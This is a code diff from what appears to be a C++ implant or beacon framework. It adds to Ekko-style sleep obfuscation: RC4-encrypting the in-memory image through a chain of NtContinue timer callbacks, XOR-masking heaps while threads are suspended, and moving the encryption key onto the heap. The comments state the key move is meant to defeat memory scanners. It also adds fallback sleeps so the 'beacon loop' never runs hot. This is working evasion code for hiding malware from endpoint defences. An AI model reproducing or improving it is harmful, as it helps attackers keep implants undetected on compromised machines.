@@ -32,6 +32,7 @@
 
 #include <constexpr.h>
 #include <stdint.h>
+#include <tlhelp32.h>
 #include <evasion/sleep_mask_types.h>
 #include <evasion/spoof_dispatch.h>
 
@@ -143,6 +144,7 @@ static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     /* mask - RWX keeps skip region executable while we XOR the rest */
     xor_sensitive_data( inst );
     flip_protection( inst, PAGE_EXECUTE_READWRITE );
+    DBG_PRINT( inst, "fi:xored_rw\n" );
     xor_image( inst, skip_base, skip_size );
 
     /* sleep - image is encrypted, these functions are in skip region */
@@ -151,9 +153,11 @@ static auto declfn fi_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     inst.ntdll.NtDelayExecution( FALSE, &delay );
 
     /* unmask */
+    DBG_PRINT( inst, "fi:slept\n" );
     xor_image( inst, skip_base, skip_size );
     flip_protection( inst, PAGE_EXECUTE_READ );
     xor_sensitive_data( inst );
+    DBG_PRINT( inst, "fi:unmasked\n" );
 }
 
 /* Pre/post are no-ops - fi_sleep owns the full cycle. */
@@ -298,8 +302,8 @@ typedef VOID     (NTAPI  *fnNtContinue)( PCONTEXT, BOOLEAN );
 typedef VOID     (NTAPI  *fnRtlCaptureContext)( PCONTEXT );
 typedef BOOL     (WINAPI *fnSetEvent)( HANDLE );
 typedef HANDLE   (WINAPI *fnCreateToolhelp32Snapshot)( DWORD, DWORD );
-typedef BOOL     (WINAPI *fnThread32First)( HANDLE, LPTHREADENTRY32 );
-typedef BOOL     (WINAPI *fnThread32Next)( HANDLE, LPTHREADENTRY32 );
+typedef BOOL     (WINAPI *fnThread32First)( HANDLE, THREADENTRY32* );
+typedef BOOL     (WINAPI *fnThread32Next)( HANDLE, THREADENTRY32* );
 typedef HANDLE   (WINAPI *fnOpenThread)( DWORD, BOOL, DWORD );
 typedef DWORD    (WINAPI *fnSuspendThread)( HANDLE );
 typedef DWORD    (WINAPI *fnResumeThread)( HANDLE );
@@ -425,7 +429,26 @@ static auto declfn ekko_heap_obfuscate(
         }
         ekko_suspend_threads( inst, worker_tid );
     } else {
+        /* XOR the heap back BEFORE resuming threads - resumed threads
+         * immediately allocate and touch heap blocks; decrypting after
+         * resume corrupts everything they allocate over */
+        HANDLE default_heap = NtCurrentPeb()->ProcessHeap;
+
+        for ( ULONG i = 0; i < num_heaps; i++ ) {
+            if ( heap_buf[i] == default_heap ) continue;
+
+            PROCESS_HEAP_ENTRY entry = {};
+            while ( pHeapWalk( heap_buf[i], &entry ) ) {
+                if ( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
+                    ekko_xor_cipher(
+                        reinterpret_cast<uint8_t*>( entry.lpData ),
+                        entry.cbData, obf->ObfKeys, 16 );
+                }
+            }
+        }
+
         ekko_resume_threads( inst, worker_tid );
+        return;
     }
 
     HANDLE default_heap = NtCurrentPeb()->ProcessHeap;
@@ -481,26 +504,48 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
          !pNtContinue || !pRtlCaptureContext || !pSetEvent || !pSystemFunction032 ) {
         DBG_PRINT( inst, "ekko: API resolution failed, falling back to XOR mask\n" );
         xor_sensitive_data( inst );
+        /* never return without sleeping - a hot beacon loop is worse than an
+         * unmasked delay */
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+        inst.ntdll.NtDelayExecution( FALSE, &delay );
         return;
     }
 
-    /* ── image base/size and fresh RC4 key ── */
+    /* ── image base/size and fresh RC4 key ──
+     * Key + USTRING structs live on the DEFAULT heap, not the stack: a
+     * memory scanner that registers the encrypted-image heuristic finds
+     * the RC4 key one frame up the sleeping thread's stack otherwise.
+     * Default heap is excluded from ekko_heap_obfuscate, so the key stays
+     * valid through the ROP encrypt/decrypt passes. Wiped + freed after. */
 
     PVOID  img_base = reinterpret_cast<PVOID>( inst.evasion.ekko.img_base );
     ULONG  img_size = inst.evasion.ekko.img_size;
 
-    BYTE rnd_key[16] = {};
-    inst.bcrypt_mod.BCryptGenRandom( nullptr, rnd_key, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
+    /* layout: [16-byte key][USTRING key_data][USTRING img_data] */
+    const uint32_t keybuf_size = 16 + sizeof( USTRING ) * 2;
+    auto keybuf = static_cast<uint8_t*>( inst.ntdll.RtlAllocateHeap(
+        NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, keybuf_size ) );
+    if ( !keybuf ) {
+        DBG_PRINT( inst, "ekko: keybuf alloc failed, plain sleep\n" );
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+        inst.ntdll.NtDelayExecution( FALSE, &delay );
+        return;
+    }
 
-    USTRING key_data = {};
-    key_data.Buffer        = rnd_key;
-    key_data.Length        = 16;
-    key_data.MaximumLength = 16;
+    inst.bcrypt_mod.BCryptGenRandom( nullptr, keybuf, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG );
 
-    USTRING img_data = {};
-    img_data.Buffer        = img_base;
-    img_data.Length        = img_size;
-    img_data.MaximumLength = img_size;
+    auto key_data = reinterpret_cast<USTRING*>( keybuf + 16 );
+    auto img_data = reinterpret_cast<USTRING*>( keybuf + 16 + sizeof( USTRING ) );
+
+    key_data->Buffer        = keybuf;
+    key_data->Length        = 16;
+    key_data->MaximumLength = 16;
+
+    img_data->Buffer        = img_base;
+    img_data->Length        = img_size;
+    img_data->MaximumLength = img_size;
 
     /* ── create timer queue and three events ── */
 
@@ -516,6 +561,9 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
 
     if ( pRtlCreateTimerQueue( &queue ) != 0 ) {
         xor_sensitive_data( inst );
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+        inst.ntdll.NtDelayExecution( FALSE, &delay );
         return;
     }
 
@@ -523,6 +571,11 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
     if ( pNtCreateEvent( &evt_timer, EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ||
          pNtCreateEvent( &evt_start, EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ||
          pNtCreateEvent( &evt_end,   EVENT_ALL_ACCESS, nullptr, 0, FALSE ) != 0 ) {
+        /* events failed to create - nothing was queued yet, just sleep plain */
+        xor_sensitive_data( inst );
+        LARGE_INTEGER delay;
+        delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+        inst.ntdll.NtDelayExecution( FALSE, &delay );
         goto ekko_leave;
     }
 
@@ -601,9 +654,11 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
         /* ── obfuscate heap + suspend threads ── */
         ekko_heap_obfuscate( inst, &heap_obf, worker_tid, true );
         xor_sensitive_data( inst );
+        DBG_PRINT( inst, "ekko:rop_queue\n" );
 
         /* ── queue the 7 NtContinue timer callbacks ── */
         bool ok = true;
+        DWORD queued_rop = 0;
         for ( int i = 0; i < 7; i++ ) {
             if ( pRtlCreateTimer( queue, &timer,
                     reinterpret_cast<WAITORTIMERCALLBACKFUNC>( pNtContinue ),
@@ -612,19 +667,45 @@ static auto declfn ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
                 DBG_PRINT( inst, "ekko: RtlCreateTimer[%d] failed\n", i );
                 break;
             }
+            queued_rop++;
         }
 
         if ( ok ) {
             /* Atomically signal EvntStart and wait on EvntEnd */
+            DBG_PRINT( inst, "ekko:signalAndWait\n" );
             pNtSignalAndWait( evt_start, evt_end, FALSE, nullptr );
+            DBG_PRINT( inst, "ekko:woke\n" );
+        } else if ( queued_rop > 0 ) {
+            /* Partial chain: contexts already queued may still fire (the
+             * encrypt stage [2] has no gate once EvntStart was NOT the thing
+             * blocking it - ctx[0] waits for EvntStart which we never signal,
+             * so the chain parks at [0] and never encrypts). Nothing executed
+             * past ctx[0] because the gate never opened. Delete the queue to
+             * cancel the parked callbacks and sleep plain. */
+            pRtlDeleteTimerQueue( queue );
+            queue = nullptr;
+            LARGE_INTEGER delay_fallback;
+            delay_fallback.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+            inst.ntdll.NtDelayExecution( FALSE, &delay_fallback );
+        } else {
+            /* Nothing queued at all - plain sleep */
+            LARGE_INTEGER delay_fallback;
+            delay_fallback.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
+            inst.ntdll.NtDelayExecution( FALSE, &delay_fallback );
         }
 
         /* ── restore ── */
         xor_sensitive_data( inst );
         ekko_heap_obfuscate( inst, &heap_obf, worker_tid, false );
+        DBG_PRINT( inst, "ekko:restore_done\n" );
     }
 
 ekko_leave:
+    /* wipe + free the RC4 key material from the default heap */
+    if ( keybuf ) {
+        memory::zero( keybuf, keybuf_size );
+        inst.ntdll.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, keybuf );
+    }
     if ( queue )     pRtlDeleteTimerQueue( queue );
     if ( evt_timer ) inst.kernel32.CloseHandle( evt_timer );
     if ( evt_start ) inst.kernel32.CloseHandle( evt_start );
